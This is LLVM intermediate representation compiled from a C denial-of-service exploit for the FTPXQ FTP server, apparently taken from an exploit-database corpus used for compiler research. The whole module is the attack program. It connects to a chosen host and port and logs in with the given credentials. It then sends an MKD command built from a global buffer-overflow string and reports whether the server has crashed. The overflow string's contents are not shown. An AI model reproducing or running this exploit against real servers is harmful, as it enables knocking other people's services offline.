; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_28860.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_28860.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.hostent = type { i32, i64 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [129 x i8] c"FTPXQ Server - Denial of service exploit.\0AFederico Fazzi <federicoautistici.org>\0A\0Ausage: %s <hostname> <port> <user> <password>\0A\00", align 1
@.str.1 = private unnamed_addr constant [16 x i8] c"gethostbyname()\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [9 x i8] c"socket()\00", align 1
@.str.3 = private unnamed_addr constant [10 x i8] c"connect()\00", align 1
@.str.4 = private unnamed_addr constant [122 x i8] c"FTPXQ Server - Denial of service exploit.\0AFederico Fazzi <federicoautistici.org>\0A---------------------------------------\0A\00", align 1
@.str.5 = private unnamed_addr constant [20 x i8] c"connecting..\09\09 done\00", align 1
@.str.6 = private unnamed_addr constant [10 x i8] c"USER %s\0D\0A\00", align 1
@.str.7 = private unnamed_addr constant [26 x i8] c"sending USER data..\09 done\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"PASS %s\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [26 x i8] c"sending PASS data..\09 done\00", align 1
@.str.10 = private unnamed_addr constant [7 x i8] c"MKD %s\00", align 1
@bof = common dso_local global i8* null, align 8
@.str.11 = private unnamed_addr constant [30 x i8] c"sending MKD bof string.. done\00", align 1
@.str.12 = private unnamed_addr constant [30 x i8] c"[!] server doesn't vulnerable\00", align 1
@.str.13 = private unnamed_addr constant [31 x i8] c"[+] server getting down.. done\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca %struct.hostent*, align 8
  %10 = alloca [512 x i8], align 16
  %11 = alloca [128 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = load i32, i32* %4, align 4
  %13 = icmp ne i32 %12, 5
  br i1 %13, label %14, label %20

14:                                               ; preds = %2
  %15 = load i8**, i8*** %5, align 8
  %16 = getelementptr inbounds i8*, i8** %15, i64 0
  %17 = load i8*, i8** %16, align 8
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([129 x i8], [129 x i8]* @.str, i64 0, i64 0), i8* %17)
  %19 = call i32 @exit(i32 1) #3
  unreachable

20:                                               ; preds = %2
  %21 = load i8**, i8*** %5, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 1
  %23 = load i8*, i8** %22, align 8
  %24 = call %struct.hostent* @gethostbyname(i8* %23)
  store %struct.hostent* %24, %struct.hostent** %9, align 8
  %25 = icmp eq %struct.hostent* %24, null
  br i1 %25, label %26, label %29

26:                                               ; preds = %20
  %27 = call i32 @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i64 0, i64 0))
  %28 = call i32 @exit(i32 1) #3
  unreachable

29:                                               ; preds = %20
  %30 = load i32, i32* @AF_INET, align 4
  %31 = load i32, i32* @SOCK_STREAM, align 4
  %32 = load i32, i32* @IPPROTO_TCP, align 4
  %33 = call i32 @socket(i32 %30, i32 %31, i32 %32)
  store i32 %33, i32* %6, align 4
  %34 = icmp slt i32 %33, 0
  br i1 %34, label %35, label %38

35:                                               ; preds = %29
  %36 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.2, i64 0, i64 0))
  %37 = call i32 @exit(i32 1) #3
  unreachable

38:                                               ; preds = %29
  %39 = bitcast %struct.sockaddr_in* %8 to i8*
  %40 = call i32 @bzero(i8* %39, i32 12)
  %41 = load i32, i32* @AF_INET, align 4
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  store i32 %41, i32* %42, align 4
  %43 = load %struct.hostent*, %struct.hostent** %9, align 8
  %44 = getelementptr inbounds %struct.hostent, %struct.hostent* %43, i32 0, i32 1
  %45 = load i64, i64* %44, align 8
  %46 = inttoptr i64 %45 to i8*
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  %48 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %47, i32 0, i32 0
  %49 = bitcast i32* %48 to i8*
  %50 = load %struct.hostent*, %struct.hostent** %9, align 8
  %51 = getelementptr inbounds %struct.hostent, %struct.hostent* %50, i32 0, i32 0
  %52 = load i32, i32* %51, align 8
  %53 = call i32 @bcopy(i8* %46, i8* %49, i32 %52)
  %54 = load i8**, i8*** %5, align 8
  %55 = getelementptr inbounds i8*, i8** %54, i64 2
  %56 = load i8*, i8** %55, align 8
  %57 = call i32 @atoi(i8* %56)
  %58 = call i32 @htons(i32 %57)
  %59 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i32 %58, i32* %59, align 4
  store i32 4, i32* %7, align 4
  %60 = load i32, i32* %6, align 4
  %61 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %62 = load i32, i32* %7, align 4
  %63 = call i32 @connect(i32 %60, %struct.sockaddr* %61, i32 %62)
  %64 = icmp eq i32 %63, -1
  br i1 %64, label %65, label %68

65:                                               ; preds = %38
  %66 = call i32 @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.3, i64 0, i64 0))
  %67 = call i32 @exit(i32 1) #3
  unreachable

68:                                               ; preds = %38
  %69 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([122 x i8], [122 x i8]* @.str.4, i64 0, i64 0))
  %70 = call i32 @puts(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.5, i64 0, i64 0))
  %71 = getelementptr inbounds [512 x i8], [512 x i8]* %10, i64 0, i64 0
  %72 = load i8**, i8*** %5, align 8
  %73 = getelementptr inbounds i8*, i8** %72, i64 3
  %74 = load i8*, i8** %73, align 8
  %75 = call i32 @sprintf(i8* %71, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.6, i64 0, i64 0), i8* %74)
  %76 = load i32, i32* %6, align 4
  %77 = getelementptr inbounds [512 x i8], [512 x i8]* %10, i64 0, i64 0
  %78 = getelementptr inbounds [512 x i8], [512 x i8]* %10, i64 0, i64 0
  %79 = call i32 @strlen(i8* %78)
  %80 = call i32 @write(i32 %76, i8* %77, i32 %79)
  %81 = call i32 @puts(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.7, i64 0, i64 0))
  %82 = getelementptr inbounds [512 x i8], [512 x i8]* %10, i64 0, i64 0
  %83 = load i8**, i8*** %5, align 8
  %84 = getelementptr inbounds i8*, i8** %83, i64 4
  %85 = load i8*, i8** %84, align 8
  %86 = call i32 @sprintf(i8* %82, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i64 0, i64 0), i8* %85)
  %87 = load i32, i32* %6, align 4
  %88 = getelementptr inbounds [512 x i8], [512 x i8]* %10, i64 0, i64 0
  %89 = getelementptr inbounds [512 x i8], [512 x i8]* %10, i64 0, i64 0
  %90 = call i32 @strlen(i8* %89)
  %91 = call i32 @write(i32 %87, i8* %88, i32 %90)
  %92 = call i32 @puts(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.9, i64 0, i64 0))
  %93 = getelementptr inbounds [512 x i8], [512 x i8]* %10, i64 0, i64 0
  %94 = load i8*, i8** @bof, align 8
  %95 = call i32 @sprintf(i8* %93, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.10, i64 0, i64 0), i8* %94)
  %96 = load i32, i32* %6, align 4
  %97 = load i8*, i8** @bof, align 8
  %98 = load i8*, i8** @bof, align 8
  %99 = call i32 @strlen(i8* %98)
  %100 = call i32 @write(i32 %96, i8* %97, i32 %99)
  %101 = call i32 @puts(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.11, i64 0, i64 0))
  %102 = load i32, i32* %6, align 4
  %103 = getelementptr inbounds [128 x i8], [128 x i8]* %11, i64 0, i64 0
  %104 = call i64 @read(i32 %102, i8* %103, i32 128)
  %105 = icmp sgt i64 %104, 0
  br i1 %105, label %106, label %108

106:                                              ; preds = %68
  %107 = call i32 @puts(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.12, i64 0, i64 0))
  br label %110

108:                                              ; preds = %68
  %109 = call i32 @puts(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.13, i64 0, i64 0))
  br label %110

110:                                              ; preds = %108, %106
  %111 = load i32, i32* %6, align 4
  %112 = call i32 @close(i32 %111)
  ret i32 0
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @bzero(i8*, i32) #1

declare dso_local i32 @bcopy(i8*, i8*, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @puts(i8*) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i64 @read(i32, i8*, i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
